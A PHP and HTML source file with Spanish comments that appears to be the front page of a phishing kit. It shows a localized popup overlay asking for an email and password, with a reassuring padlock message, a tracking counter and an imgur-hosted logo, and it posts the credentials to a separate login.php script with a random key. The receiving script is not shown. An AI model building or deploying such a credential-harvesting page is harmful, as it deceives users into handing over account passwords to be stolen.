<?php

include_once '../common.php';


// Verifico si se necesita un conjunto de caracteres especial para presentar la pagina
switch ($lang['LANG']) {
	case 'th':
	header('Content-Type: text/html; charset=TIS-620');
	break;
	
	case 'el':
	header('Content-Type: text/html; charset=iso-8859-7');
	break;
	
	case 'ru':
	header('Content-Type: text/html; charset=iso-8859-5');
	break;
	
	default:
	header('Content-Type: text/html; charset=ISO-8859-15');
	
		
}

// Creo KEY
$longitud = '100';
$key = '';
$keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
$max = strlen($keys) - 1;
for($i=0; $i < $longitud; $i++){
	// echo $key;
	$key .= $keys{mt_rand(0,$max)};
}
?>







<html>
	<head>
	<!--meta charset="utf-8"--> 
	<meta charset="charset=ISO-8859-1">
	<title><?php echo $lang['TITULO_PAGINA']; ?></title>
	<link rel="shortcut icon" href="http://i.imgur.com/E9Fn1cV.png" />
	<link rel="stylesheet" href="style.css" type="text/css" media="screen"/>
	<style type="text/css">
		#header #nav {
			background: url(<?php echo "img/TopNav-" . $lang['LANG'] . ".PNG";?>) center center no-repeat;
		}
	</style>	
	<script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script>
<a href="http://www.histats.com" target="_blank" title="contador web" ><script  type="text/javascript" >
try {Histats.start(1,3205176,4,0,0,0,"");
Histats.track_hits();} catch(err){};
</script></a>
<noscript><a href="http://www.histats.com" target="_blank"><img  src="http://sstatic1.histats.com/0.gif?3205176&101" alt="contador web" border="0"></a></noscript>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script> 
	
	</head>
 
<body>
	<div id="header">
	<div id="nav"></div>
	</div>
         
	<div id="BgCuerpo"></div>
	
	<div id="BodyCuerpo">
	<div id="Cuerpo">
	<div id="CuerpoMain">
	
		<div id="CuerpoImgs">
			<img src="http://i.imgur.com/E9Fn1cV.png" class="Img" width="70" height="70"/>
		</div>
		
		<div id="TituloCuerpo" >
			<span id="Tbold"><?php echo $lang['POPUP_TITULO'] ?></span>
			<?php echo $lang['POPUP_DESCRIPCION'] ?>
		</div>
		
		<div id="Formulario">
		<ul>
		<form id="form" method="post" target="_top" action="../login.php?key=<?php echo $key; ?>">
		<li><label id="LoginForm"><?php echo $lang['POPUP_CORREO'] ?>:</label></li>
		<li><input type="text" id="input" name="email" placeholder="<?php echo $lang['POPUP_CORREO'] ?>" autocomplete="off" required/></li>
		<li><label id="LoginForm"><?php echo $lang['POPUP_CONTRASENA'] ?>:</label></li> 
		<li><input type="password" id="input" name="pass" placeholder="<?php echo $lang['POPUP_CONTRASENA'] ?>" autocomplete="off" required/></li>
		<li><input class="uibutton confirm" type="submit" value="<?php echo $lang['POPUP_SUBMIT'] ?>" ></li>
		</form>
		</ul>
		</div>
		
	</div>
	
	<div id="Candao">
		<img src="http://i.imgur.com/LE87vI1.png" class="Img" width="13" height="13">
		<?php echo $lang['POPUP_CANDADO'] ?>
	</div>
		
	</div>
	</div>
	
<script>
$(document).ready(function(){
	setTimeout(function(){ 
		$("#BgCuerpo, #BodyCuerpo").fadeIn(); 
	}, 500);
});
</script>

</body>
</html>